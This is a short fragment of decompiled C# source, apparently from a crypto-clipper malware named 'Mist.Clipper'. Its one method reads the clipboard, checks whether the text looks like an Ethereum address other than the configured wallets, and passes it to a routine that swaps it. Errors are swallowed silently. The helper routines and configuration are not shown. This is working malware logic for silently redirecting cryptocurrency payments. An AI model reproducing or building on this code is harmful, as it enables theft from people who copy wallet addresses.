using System;
using System.Linq;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x0200007A RID: 122
	internal class Etherium
	{
		// Token: 0x060002D4 RID: 724 RVA: 0x000132CC File Offset: 0x000114CC
		public static void GetEtheriumWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletseth.Contains(text) && CheckEth.Clipregex(text))
					{
						CheckEth.SetsEtherium(text);
					}
				}
			}
			catch
			{
			}
		}
	}
}
